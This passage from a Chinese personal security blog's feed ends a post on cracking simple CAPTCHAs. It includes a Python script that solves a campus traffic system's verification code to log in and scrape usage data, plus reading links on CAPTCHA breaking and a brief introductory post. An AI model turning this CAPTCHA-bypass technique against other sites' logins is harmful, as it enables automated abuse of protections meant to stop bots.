requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 识别验证码</span></span><br><span class="line">vcode = get_vcode(req, vcode_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line"><span class="keyword">if</span> login(req, vcode, user, passwd):</span><br><span class="line">    <span class="comment"># 抓主页内容</span></span><br><span class="line">    r = req.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.text)</span><br><span class="line">    results = soup.find_all(attrs=&#123;<span class="string">'class'</span>: <span class="string">"title td_content"</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print req.cookies</span></span><br><span class="line">    <span class="keyword">print</span> results[-<span class="number">2</span>].text</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] Please try again!'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] Your cookie is '</span>,req.cookies</span><br></pre></td></tr></table></figure>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/hello.png" alt="效果图"></p>
<p>如果你想用这个小脚本来简化查流量的工作，如果你的流量管理系统也是深澜，那么你只要改了代码中的<code>user</code>和<code>passwd</code>为自己的信息，然后<code>url</code>为流量查询主页和<code>vcode_path</code>为验证码图片的路径，这个脚本就可以为你工作了！</p>
<p>##0x04 真正的验证码识别</p>
<p>上面的东西只能说是一些小tricks，都还不能算入了验证码识别的门，我也仅仅是抛砖引玉。其实真正的要破解各种验证码是一件很高深的事情，其中涉及了图像处理，模式识别，机器视觉，人工智能等等高深莫测的概念。作为分享，也为了自己以后在这方面能更深入，我在这里记录一些参考资料</p>
<p><a href="http://huaidan.org/archives/2085.html" target="_blank" rel="external">如何识别高级的验证码</a><br><a href="http://caca.zoy.org/wiki/PWNtcha" target="_blank" rel="external">PWNtcha</a><br><a href="http://linux.im/2015/03/17/12306-new-captcha.html" target="_blank" rel="external">12306 售票网站新版验证码识别对抗</a><br><a href="http://www.ruanyifeng.com/blog/2011/07/principle_of_similar_image_search.html" target="_blank" rel="external">相似图片搜索的原理</a></p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/Bled Castle, Slovenia.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>##0x00 前戏</p>
<p>第一篇文章记录一下自己写的一个小脚本，关于识别验证码与Python登陆网站并抓取信息。重头戏放在了验证码识别上，所以题目就是识别简单的验证码了。</p>
<p>##0x01 认识验证码</p>
<p>全自动区分计算机和人类的公开图灵测试（英语：Completely Automated Public Turing test to tell Computers and Humans Apart，简称CAPTCHA），俗称验证码，是一种区分用户是计算机和人的公共全自动程序。<a href="http://zh.wikipedia.org/wiki/%E9%AA%8C%E8%AF%81%E7%A0%81">来源：维基百科</a>。设计验证码就是为了抵御机器的攻击，但是很多的验证码是形同虚设，像我们学校校园网用的深澜的系统，在查流量登录时的验证码，就很容易被机器识别。<img src="http://7xi3ed.com1.z0.glb.clouddn.com/vcode.png" alt="深澜验证码"><br>]]>
    
    </summary>
    
      <category term="Python" scheme="http://xkon.githb.io/tags/Python/"/>
    
      <category term="验证码" scheme="http://xkon.githb.io/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Hello world]]></title>
    <link href="http://xkon.githb.io/2015/04/06/hello%20world/"/>
    <id>http://xkon.githb.io/2015/04/06/hello world/</id>
    <published>2015-04-06T04:15:47.000Z</published>
    <updated>2015-10-14T03:53:01.000Z</updated>
    <content type="html"><![CDATA[<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/Yellowstone National Park, U.S.jpg" alt=""></p>
<p>我是一个后知后觉的人，差不多一年前（大二）才开始接触网络安全，这已经算比较晚了。现在我开了这个Blog，只是为了记录自己过去一年的所学所得，以及将来的所见所思。在这里我将分享网络安全的一些东西，因为自己的兴趣比较杂，所以也会涉及到信息安全下很多其他领域。欢迎来到这里的各位同我交流。我的twitter<a href="https://twitter.com/xk0n_" target="_blank" rel="external">@xk0n_</a>，<a href="mailto:xalvint@gmail.com" target="_blank" rel="external">gmail</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/Yellowstone National Park, U.S.jpg" alt=""></p>
<p>我是一个后知后觉的人，差不多一年前（大二）才开始接触网络安全，这已经算比较晚]]>
    </summary>
    
  </entry>
  
</feed>
